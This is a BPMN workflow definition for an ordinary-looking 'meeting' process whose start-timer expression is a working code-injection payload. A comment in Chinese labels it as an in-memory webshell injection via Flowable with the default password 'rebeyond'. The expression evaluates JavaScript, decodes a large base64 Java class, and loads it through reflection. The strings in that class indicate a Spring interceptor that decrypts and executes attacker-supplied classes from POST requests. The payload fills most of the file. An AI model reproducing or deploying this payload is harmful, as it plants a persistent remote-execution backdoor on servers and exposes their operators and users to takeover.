<?xml version="1.0" encoding="UTF-8"?>
<definitions xmlns="http://www.omg.org/spec/BPMN/20100524/MODEL"
             xmlns:activiti="http://activiti.org/bpmn"
             typeLanguage="http://www.w3.org/2001/XMLSchema"
             expressionLanguage="http://www.w3.org/1999/XPath"
             targetNamespace="http://www.activiti.org/test">

    <process id="meeting" name="meeting" isExecutable="true">
        <startEvent id="startEvent1" name="Start" activiti:initiator="host">
            <timerEventDefinition>
                <!-- 使用flowable注入内存马，默认连接密码rebeyond -->
                <!-- 其中实现类为A12345 -->
                <timeDuration>
                    ${"".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval('
                        var contextClassLoader = java.lang.Thread.currentThread().getContextClassLoader();
                        var bytecodeBase64 = \'yv66vgAAADQBTQoAVQCtCgA2AK4KACoArwgAsAoAKwCxBwCyCgAGALMHALQKAAgAswcAtQgAtgsACgC3CAC4CgArALkHALoIAI4KACoAuwoAvAC9CgC8AL4HAL8KABQAwAoAFADBBwDCCgAXAK0KABcAwwgAxAgAxQgAxggAxwsAyADJCADKCgDLAMwHAM0KACsAzgoAIQDPCgDLANAKANEA0goA0QDTCADUCgAqANUIANYHANcHANgHAIcJANkA2goAKgDbCgDcAL0HAN0KADAArQoAFADeCgDfAOAKADAA4QoAywDiBwDjCgDZAOQKANwA5QoAKgDmCgA2ALkIAOcIAOgHAOkKAD0A6gsA6wDsCwDrAO0HAO4HAO8IAPALAEIA8QcA8ggAmAcA8wcA9AgA9QcA9gcA9woASwCtCgBIAPgLAEcA+QoAvAD6CACZCgA2APsIAPwHAP0KAFMA/gcA/wcBAAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAITEExMjM0NTsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAR2YXIxAQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAEdmFyMgEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAQEBABBNZXRob2RQYXJhbWV0ZXJzAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAEdmFyMwEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAJcHJlSGFuZGxlAQBkKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDspWgEAKHNlY3VyaXR5Q29udGV4dEhvbGRlckF3YXJlUmVxdWVzdFdyYXBwZXIBAFZMb3JnL3NwcmluZ2ZyYW1ld29yay9zZWN1cml0eS93ZWIvc2VydmxldGFwaS9TZWN1cml0eUNvbnRleHRIb2xkZXJBd2FyZVJlcXVlc3RXcmFwcGVyOwEAGWh0dHBTZXJ2bGV0UmVxdWVzdFdyYXBwZXIBAC5MamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdFdyYXBwZXI7AQAaaHR0cFNlcnZsZXRSZXF1ZXN0V3JhcHBlcjEBAAR2YXI0AQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABHZhcjUBACdMb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdDsBAAR2YXI2AQAoTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlOwEABHZhcjcBACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEABHZhcjgBABNMamF2YS91dGlsL0hhc2hNYXA7AQAEdmFyOQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABXZhcjEwAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQAFdmFyMTEBABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEABXZhcjEyAQARTGphdmEvbGFuZy9DbGFzczsBAAV2YXIxMwEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAFdmFyMTQBAAJbQgEABXZhcjE1AQAEcmVxMQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEABHJlc3ABAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQASTGphdmEvbGFuZy9PYmplY3Q7AQAHcmVxdWVzdAEADVN0YWNrTWFwVGFibGUHALUBAAg8Y2xpbml0PgEAF2Fic3RyYWN0SGFuZGxlck1hcHBpbmcxAQBATG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvaGFuZGxlci9BYnN0cmFjdEhhbmRsZXJNYXBwaW5nOwEAAW8BABBMamF2YS91dGlsL0xpc3Q7AQAWYWJzdHJhY3RIYW5kbGVyTWFwcGluZwEAGGFkYXB0ZWRJbnRlcmNlcHRvcnNGaWVsZAEAE2FkYXB0ZWRJbnRlcmNlcHRvcnMBABZyZXNvdXJjZUhhbmRsZXJNYXBwaW5nAQAVd2ViQXBwbGljYXRpb25Db250ZXh0AQA3TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvV2ViQXBwbGljYXRpb25Db250ZXh0OwEAHmNvbmZpZ3VyYWJsZUFwcGxpY2F0aW9uQ29udGV4dAEAPExvcmcvc3ByaW5nZnJhbWV3b3JrL2NvbnRleHQvQ29uZmlndXJhYmxlQXBwbGljYXRpb25Db250ZXh0OwEAGGFwcGxpY2F0aW9uQ29udGV4dHNGaWVsZAEAB2hhc2hTZXQBABlMamF2YS91dGlsL0xpbmtlZEhhc2hTZXQ7AQAIaXRlcmF0b3IBABRMamF2YS91dGlsL0l0ZXJhdG9yOwEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAFkxvY2FsVmFyaWFibGVUeXBlVGFibGUBAFdMamF2YS91dGlsL0xpbmtlZEhhc2hTZXQ8TG9yZy9zcHJpbmdmcmFtZXdvcmsvY29udGV4dC9Db25maWd1cmFibGVBcHBsaWNhdGlvbkNvbnRleHQ7PjsBAFJMamF2YS91dGlsL0l0ZXJhdG9yPExvcmcvc3ByaW5nZnJhbWV3b3JrL2NvbnRleHQvQ29uZmlndXJhYmxlQXBwbGljYXRpb25Db250ZXh0Oz47BwECBwDpBwEDBwD9AQAKU291cmNlRmlsZQEAC0ExMjM0NS5qYXZhDABXAFgMAQQBBQwBBgEHAQAwU2VydmxldDNTZWN1cml0eUNvbnRleHRIb2xkZXJBd2FyZVJlcXVlc3RXcmFwcGVyDAEIAQkBAFRvcmcvc3ByaW5nZnJhbWV3b3JrL3NlY3VyaXR5L3dlYi9zZXJ2bGV0YXBpL1NlY3VyaXR5Q29udGV4dEhvbGRlckF3YXJlUmVxdWVzdFdyYXBwZXIMAQoBCwEALGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3RXcmFwcGVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAF1NoaXJvSHR0cFNlcnZsZXRSZXF1ZXN0DAEMAQcBAARQT1NUDAENAQ4BACtvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0RmFjYWRlDAEPARAHAQIMAREBEgwBEwEUAQAlb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdAwBFQEWDAEXARgBABFqYXZhL3V0aWwvSGFzaE1hcAwBGQEaAQAIcmVzcG9uc2UBAAdzZXNzaW9uAQAQZTQ1ZTMyOWZlYjVkOTI1YgEAAXUHARsMARwBHQEAA0FFUwcBHgwBHwEgAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwBIQEiDABXASMMASQBJQcBJgwBJwEoDAEpASoBABVqYXZhLmxhbmcuQ2xhc3NMb2FkZXIMASsBLAEAC2RlZmluZUNsYXNzAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL1N0cmluZwcBLQwBLgCDDAEvATAHATEBABZzdW4vbWlzYy9CQVNFNjREZWNvZGVyDAEyATMHATQMATUBBwwBNgE3DAE4ATkBABBqYXZhL2xhbmcvT2JqZWN0DAE6ATsMATwBPQwBPgE/AQAxb3JnLnNwcmluZ2ZyYW1ld29yay5jb250ZXh0LnN1cHBvcnQuTGl2ZUJlYW5zVmlldwEAE2FwcGxpY2F0aW9uQ29udGV4dHMBABdqYXZhL3V0aWwvTGlua2VkSGFzaFNldAwAoQFABwEDDAFBAUIMAUMBPwEAOm9yZy9zcHJpbmdmcmFtZXdvcmsvY29udGV4dC9Db25maWd1cmFibGVBcHBsaWNhdGlvbkNvbnRleHQBADVvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L1dlYkFwcGxpY2F0aW9uQ29udGV4dAEAHHJlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmcMAUQBRQEAPm9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvaGFuZGxlci9BYnN0cmFjdEhhbmRsZXJNYXBwaW5nAQAOamF2YS91dGlsL0xpc3QBADlvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L2hhbmRsZXIvTWFwcGVkSW50ZXJjZXB0b3IBAAQveHh4AQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABkExMjM0NQwAVwFGDAFHAUgMAUkBSgwBSwEHAQAEbnVsbAEAE2phdmEvbGFuZy9FeGNlcHRpb24MAUwAWAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L0hhbmRsZXJJbnRlcmNlcHRvcgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQASamF2YS91dGlsL0l0ZXJhdG9yAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAApnZXRSZXF1ZXN0AQAgKClMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAAlnZXRNZXRob2QBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAC2dldFJlc3BvbnNlAQAqKClMb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVzcG9uc2U7AQAKZ2V0U2Vzc2lvbgEAIigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbjsBAANwdXQBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEACHB1dFZhbHVlAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvT2JqZWN0OylWAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBABFqYXZhL2xhbmcvSW50ZWdlcgEABFRZUEUBABFnZXREZWNsYXJlZE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAlnZXRSZWFkZXIBABooKUxqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBAAhyZWFkTGluZQEADGRlY29kZUJ1ZmZlcgEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkb0ZpbmFsAQAGKFtCKVtCAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBAAZpbnZva2UBADkoTGphdmEv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\';
                        var bytecode;
                        try {
                            var clsString = contextClassLoader.loadClass(\'java.lang.String\');
                            var clsBase64 = contextClassLoader.loadClass(\'java.util.Base64\');
                            var clsDecoder = contextClassLoader.loadClass(\'java.util.Base64$Decoder\');
                            var decoder = clsBase64.getMethod(\'getDecoder\').invoke(null);
                            bytecode = clsDecoder.getMethod(\'decode\',clsString).invoke(decoder,bytecodeBase64);
                            var clsClassLoader = contextClassLoader.loadClass(\'java.lang.ClassLoader\');
                            var clsByteArray = (new java.lang.String(\'c\').getBytes().getClass());
                            var clsInt = java.lang.Integer.TYPE;
                            var defineClass = clsClassLoader.getDeclaredMethod(\'defineClass\', [clsByteArray, clsInt, clsInt]);
                            defineClass.setAccessible(true);
                            java.lang.System.out.println(222);
                            java.lang.System.out.println(bytecode.getClass().getName());
                            var clazz = defineClass.invoke(contextClassLoader, bytecode, new java.lang.Integer(0), new java.lang.Integer(bytecode.length));
                            java.lang.System.out.println(111);
                            clazz.newInstance();
                        } catch (ee) {
                            java.lang.System.out.println(ee);
                            ee.printStackTrace();
                        }
                    ')}
                </timeDuration>
            </timerEventDefinition>
        </startEvent>
        <userTask id="userTask2" name="meeting2" activiti:assignee="${person}" activiti:formKey="meeting/signate">
            <multiInstanceLoopCharacteristics isSequential="false" activiti:collection="people"
                                              activiti:elementVariable="person"></multiInstanceLoopCharacteristics>
        </userTask>

        <userTask id="usertask3" name="meeting3" activiti:assignee="${host}" activiti:formKey="meeting/input">

        </userTask>

    </process>

</definitions>